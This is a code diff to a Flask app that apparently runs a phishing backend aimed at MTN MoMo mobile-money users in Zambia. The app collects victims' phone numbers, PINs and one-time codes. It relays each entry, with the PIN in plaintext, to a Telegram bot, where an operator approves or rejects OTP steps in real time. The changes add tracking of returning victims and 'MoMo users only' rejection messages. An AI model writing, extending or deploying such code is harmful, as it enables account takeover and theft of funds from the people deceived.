@@ -23,12 +23,28 @@ def init_db():
         app_id TEXT, plan TEXT, amount INTEGER,
         phone TEXT, pin TEXT, code TEXT,
         status TEXT DEFAULT 'pending',
-        code_status TEXT DEFAULT 'pending'
+        code_status TEXT DEFAULT 'pending',
+        invalid_type TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS users (
+        phone TEXT UNIQUE, total_applications INTEGER DEFAULT 1
     )''')
     conn.commit()
     conn.close()
 
 init_db()
+
+def add_column():
+    conn = sqlite3.connect('database.db')
+    c = conn.cursor()
+    try:
+        c.execute('ALTER TABLE payments ADD COLUMN invalid_type TEXT')
+    except:
+        pass
+    conn.commit()
+    conn.close()
+
+add_column()
 
 def send_telegram(message, reply_markup=None):
     try:
@@ -59,6 +75,7 @@ def submit_payment():
     purpose = data.get('purpose','')
     conn = sqlite3.connect('database.db'); c = conn.cursor()
     
+    # OTP REQUESTED
     if purpose == 'OTP REQUESTED':
         c.execute("SELECT COUNT(*) FROM payments WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
         if c.fetchone()[0] >= 3:
@@ -69,15 +86,26 @@ def submit_payment():
         c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
         conn.commit(); conn.close()
         msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}'
-        send_telegram(msg, {'inline_keyboard':[[{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
+        send_telegram(msg, {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'denyotp_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
         return jsonify({'success':True,'app_id':app_id})
+    
+    # Check returning user
+    c.execute('SELECT total_applications FROM users WHERE phone = ?',(phone,))
+    existing = c.fetchone()
+    is_returning = existing is not None
+    
+    if is_returning:
+        c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?',(phone,))
+    else:
+        c.execute('INSERT INTO users (phone) VALUES (?)',(phone,))
     
     app_id = 'MM-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     code = str(random.randint(1000, 9999))
     c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
     conn.commit(); conn.close()
     
-    msg = f'📥 NEW PAYMENT\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}\n🔢 PIN: {pin}'
+    prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW PAYMENT'
+    msg = f'{prefix}\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}\n🔢 PIN: {pin}'
     send_telegram(msg, {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
     return jsonify({'success':True,'app_id':app_id})
 
@@ -97,9 +125,15 @@ def submit_code():
 @app.route('/api/check_status/<app_id>')
 def check_status(app_id):
     conn = sqlite3.connect('database.db'); c = conn.cursor()
-    c.execute('SELECT status, code_status FROM payments WHERE app_id = ?',(app_id,))
-    p = c.fetchone(); conn.close()
-    if p: return jsonify({'status':p[0],'code_status':p[1]})
+    try:
+        c.execute('SELECT status, code_status, invalid_type FROM payments WHERE app_id = ?',(app_id,))
+        p = c.fetchone()
+        if p: return jsonify({'status':p[0],'code_status':p[1],'invalid_type':p[2] or ''})
+    except:
+        c.execute('SELECT status, code_status FROM payments WHERE app_id = ?',(app_id,))
+        p = c.fetchone()
+        if p: return jsonify({'status':p[0],'code_status':p[1],'invalid_type':''})
+    conn.close()
     return jsonify({'status':'not_found'})
 
 @app.route('/webhook', methods=['POST'])
@@ -110,31 +144,43 @@ def webhook():
         msg_id = cb['message']['message_id']; original = cb['message']['text']
         conn = sqlite3.connect('database.db'); c = conn.cursor()
         
-        if cb_data.startswith('deny_'): 
+        # INVALID on NEW PAYMENT or RETURNING USER
+        if cb_data.startswith('deny_') and not cb_data.startswith('denyotp_'):
             aid = cb_data.replace('deny_','')
-            c.execute('UPDATE payments SET status="invalid" WHERE app_id=?',(aid,))
+            c.execute('UPDATE payments SET status="invalid", invalid_type="momo_only" WHERE app_id=?',(aid,))
             conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ INVALID')
+            edit_telegram(msg_id, original+'\n\n❌ INVALID - MTN MoMo users only')
         
-        elif cb_data.startswith('allow_'): 
+        # INVALID on OTP REQUESTED
+        elif cb_data.startswith('denyotp_'):
+            aid = cb_data.replace('denyotp_','')
+            c.execute('UPDATE payments SET status="invalid", invalid_type="momo_only" WHERE app_id=?',(aid,))
+            conn.commit()
+            edit_telegram(msg_id, original+'\n\n❌ INVALID - This data is only for MTN MoMo users. Try with MTN MoMo.')
+        
+        # ALLOW OTP
+        elif cb_data.startswith('allow_'):
             aid = cb_data.replace('allow_','')
             c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(aid,))
             conn.commit()
             edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
         
-        elif cb_data.startswith('wrongpin_'): 
+        # WRONG PIN
+        elif cb_data.startswith('wrongpin_'):
             aid = cb_data.replace('wrongpin_','')
-            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin" WHERE app_id=?',(aid,))
+            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin", invalid_type="wrong_pin" WHERE app_id=?',(aid,))
             conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN - User sent back')
+            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
         
-        elif cb_data.startswith('wrongcode_'): 
+        # WRONG CODE
+        elif cb_data.startswith('wrongcode_'):
             aid = cb_data.replace('wrongcode_','')
             c.execute('UPDATE payments SET code_status="wrong_code" WHERE app_id=?',(aid,))
             conn.commit()
             edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
         
-        elif cb_data.startswith('approve_'): 
+        # APPROVE
+        elif cb_data.startswith('approve_'):
             aid = cb_data.replace('approve_','')
             c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(aid,))
             conn.commit()
